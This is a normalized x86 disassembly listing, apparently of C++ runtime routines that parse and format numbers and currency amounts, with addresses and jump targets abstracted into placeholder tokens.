lea ecx [ ebp - 0xec ]
call sub_1003bd13
xor esi esi
test [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003bc51
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov edi [ ebp - 0x6c ]
push edi
movzx esi ax
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
lea ecx [ ebp - 0x98 ]
call sub_1003aed5
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_1003bc51
cmp ax [ esi ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx [ ebp - 0x6c ]
call sub_1003bc51
cmp ax [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x76 ] 0x0
je r-xdata
and [ ebp - 0x70 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x124 ]
call sub_1003bd13
mov ecx [ ebp - 0x6c ]
call sub_1003bc51
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov edi [ ebp - 0x7c ]
cmp [ edi + 0x14 ] 0x0
jne r-xdata
test si si
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x98 ]
call sub_1003b046
mov ecx [ ebp - 0x6c ]
call sub_1003b9f8
lea eax [ ebp - 0x140 ]
push eax
mov ecx ebx
call sub_1003c040
or [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003b9f8
lea eax [ ebp - 0x15c ]
push eax
mov ecx ebx
call sub_1003c182
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_1003c2b5
push esi
lea ecx [ ebp - 0x15c ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003bc51
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_1003c19b
mov ecx [ ebp - 0x6c ]
call sub_1003b9f8
mov esi [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] esi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx edi
call sub_1003bc51
cmp ax si
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005ad1
push [ ebp - 0x74 ]
mov esi [ ebp - 0x6c ]
push esi
mov [ ebp - 0x4 ] 0xc
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x108 ]
push eax
mov ecx ebx
call sub_1003c040
or [ ebp - 0x70 ] 0x10
push esi
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_1003b482
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_1003bc51
cmp [ esi ] ax
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1003bd13
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_100023ce
jmp r-xdata
sub esi [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x10
mov esi [ ebp - 0x60 ]
jae r-xdata
mov ecx esi
call sub_1003bc51
cmp [ ebp - 0x80 ] ax
ja r-xdata
test [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x108 ]
call sub_1003bd13
mov bl 0x1
jmp r-xdata
push [ ebp - 0x80 ]
mov ecx edi
push 0x1
call sub_1003c19b
dec esi
jne r-xdata
jmp r-xdata
mov ecx edi
call sub_1003b9f8
push [ ebp - 0x74 ]
push edi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x60 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_1003bc51
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x70 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x140 ]
call sub_1003bd13
test [ ebp - 0x70 ] 0x10
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax [ ebp - 0x9c ]
jge r-xdata
mov eax [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
test edi edi
jbe r-xdata
test edi edi
je r-xdata
mov ecx esi
call sub_1003bc51
cmp ax [ ebp - 0xb8 ]
jne r-xdata
mov ecx esi
call sub_1003bc51
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_1003c19b
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003b9f8
mov ecx [ ebp - 0xa0 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_1003c040
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_1003c2b5
push 0x0
push 0x1
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
call sub_1003bd13
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx edi
call sub_1003bc51
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov [ ebp - 0x65 ] 0x1
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_100023ce
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
inc edi
mov ecx esi
call sub_1003b9f8
push [ ebp - 0x74 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
mov ecx edi
call sub_1003bc51
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
mov ecx edi
call sub_1003bc51
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_1003c19b
inc [ ebp - 0x84 ]
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_10040a87
push 0x11c
mov eax sub_1004822e
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x74 ] ecx
xor edi edi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1003e0a7
pop ecx
lea ecx [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1003e144
pop ecx
lea ecx [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x6c ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10007b41
add esi 0x8
push esi
push edi
push 0x30
call sub_1003a3ed
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
mov [ ebp - 0x78 ] esi
call sub_1004458c
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax edi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x6c ]
sub ecx eax
push esi
inc ecx
push ecx
push edi
lea ecx [ ebp + 0x24 ]
call sub_1003c422
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_1003c01f
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003c182
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003c040
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
xor esi esi
mov [ ebp - 0x65 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003c0be
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_1003c2b5
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_1003bd13
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003c2b5
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
call sub_1003bd13
lea ecx [ ebp - 0x64 ]
call sub_1003c01f
mov eax [ ebp - 0x74 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
movzx eax ax
mov [ ebp - 0x70 ] eax
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x6c ]
jmp r-xdata
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x65 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + 0x18 ]
cmp eax edi
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
xor esi esi
cmp eax esi
jbe r-xdata
mov edx [ ebp - 0x6c ]
cmp [ ebp + 0x38 ] edx
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x7c ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
mov eax edx
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_1003c422
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0x94 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b7f7
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b7f7
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov edi [ ecx + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edi edi
cmp edi edx
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
mov edi eax
inc [ ebp - 0x7c ]
cmp [ ebp - 0x7c ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b7f7
add esp 0x14
xor esi esi
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_1003bbc2
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x7c ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b7bb
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x74 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x84 ]
call sub_1003b7f7
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_1003bd13
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_1003bd13
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_1003bd13
mov eax [ ebp - 0x84 ]
call sub_10023f1f
retn 0x38
push edi
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003bbc2
mov ecx eax
call sub_1003bd8f
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b7bb
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003bbc2
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf0 ]
jmp r-xdata
mov eax [ ebp - 0x6c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1003bbc2
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd0 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1003bbc2
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x6c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x118 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b7bb
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b2bd
push [ ebp - 0x6c ]
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1003bce9
mov ecx eax
call sub_1003bdbe
push [ ebp - 0x6c ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe0 ]
jmp r-xdata
push [ ebp - 0x78 ]
lea ecx [ ebp + 0xc ]
call sub_1003b2bd
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b2bd
mov eax [ ebp - 0x6c ]
sub eax [ ebp + 0x38 ]
push eax
push [ ebp - 0x78 ]
lea eax [ ebp - 0xd8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003b7f7
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1003bbc2
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf8 ]
jmp r-xdata
sub_10040fd5
push 0x10
mov eax sub_10048256
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_1000762b
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1003e31b
push edi
push ebx
push eax
call sub_1003a41b
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1003e35a
push edi
push ebx
push eax
call sub_1003a41b
add esp 0xc
mov [ esi + 0xc ] eax
call sub_10046dc4
mov [ esi + 0x10 ] eax
call sub_10023f0b
retn 0x4
sub_10041058
push 0x54
mov eax sub_10048281
call sub_10023e9c
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x60 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x5c ] ebx
call sub_1003e4e2
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_100070de
add esp 0xc
lea ecx [ ebp - 0x48 ]
movzx ebx ax
call sub_10007ee2
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006a43
xor esi esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1001c430
cmp [ eax ] bx
jb r-xdata
or [ edi ] 0x2
jmp r-xdata
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10005af7
push esi
lea ecx [ ebp - 0x2c ]
call sub_1001c430
movzx eax [ eax ]
movzx ecx bx
add ecx 0x9
cmp ecx eax
jge r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10002597
mov eax ebx
call sub_10023f1f
retn 0x24
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x49 ] 0x30
sub [ ebp - 0x49 ] bl
cmp esi [ ebp - 0x18 ]
jae r-xdata
lea eax [ ebp - 0x50 ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x50 ] ebx
call sub_1001c127
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x44 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_1001c430
mov al [ eax ]
add al [ ebp - 0x49 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x58 ] al
push [ ebp - 0x58 ]
push 0x1
call sub_10005af7
inc esi
cmp esi [ ebp - 0x18 ]
jb r-xdata
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x50 ] ebx
jne r-xdata
mov eax [ ebp - 0x60 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov ebx [ ebp - 0x5c ]
sub_100411aa
push 0x20
mov eax sub_100482ae
call sub_10023e9c
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1003e4e2
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10002033
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10002597
mov eax edi
call sub_10023f1f
retn 0x24
sub_10041229
push 0x54
mov eax sub_100482db
call sub_10023e9c
fldz
xor ebx ebx
fcomp [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ebx
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_10001b23
fld [ ebp + 0x20 ]
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1002088b
add esp 0x14
xor esi esi
cmp eax ebx
mov [ ebp - 0x5c ] eax
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_100070de
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10005c07
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_100020c6
push [ ebp - 0x60 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ed60
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10002597
mov eax [ ebp + 0x8 ]
call sub_10023f1f
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_100070de
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10005c07
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_10041349
push 0x2c
mov eax sub_10048308
call sub_10023e9c
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x34 ] edi
add edi 0x8
push edi
push 0x0
push 0x30
call sub_100070de
add esp 0xc
cmp [ esi + 0x18 ] 0x8
movzx ebx ax
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
movzx eax [ esi ]
cmp bx ax
ja r-xdata
inc esi
mov [ ebp - 0x30 ] 0x1
inc esi
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x30 ] 0x0
call sub_100070de
add esp 0xc
cmp [ esi ] ax
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000482d
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
movzx ecx bx
movzx eax ax
add ecx 0x9
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x38 ] esp
push eax
call sub_100020c6
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ed60
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002597
mov eax [ ebp + 0x8 ]
call sub_10023f1f
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005c07
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_1004141f
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1003f2ae
mov eax esi
call sub_10023f0b
retn 0x8
sub_10041452
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x18 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x20
sub_10041493
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004147b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100414b4
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ebx
call sub_100070de
add esp 0xc
push [ ebp - 0x28 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea edi [ ebp - 0x24 ]
call sub_10006709
test al al
jne r-xdata
push [ ebp - 0x28 ]
xor bl bl
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push 0x0
push 0x2b
call sub_100070de
add esp 0xc
mov ecx esi
mov bx ax
call sub_10005d9c
cmp ax bx
jne r-xdata
push [ ebp - 0x28 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10005d9c
cmp ax [ ebp - 0x2c ]
jne r-xdata
push [ ebp - 0x34 ]
push 0x0
push 0x2d
call sub_100070de
add esp 0xc
mov ecx esi
mov bx ax
call sub_10005d9c
cmp ax bx
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ecx esi
call sub_10005d9c
cmp [ ebp - 0x2c ] ax
ja r-xdata
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_10005eb7
push [ ebp - 0x28 ]
push esi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] 0x2d
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_10005eb7
mov ecx esi
call sub_10005d9c
movzx ecx [ ebp - 0x2c ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x30 ] ebx
call sub_1001bd2f
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_10006709
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
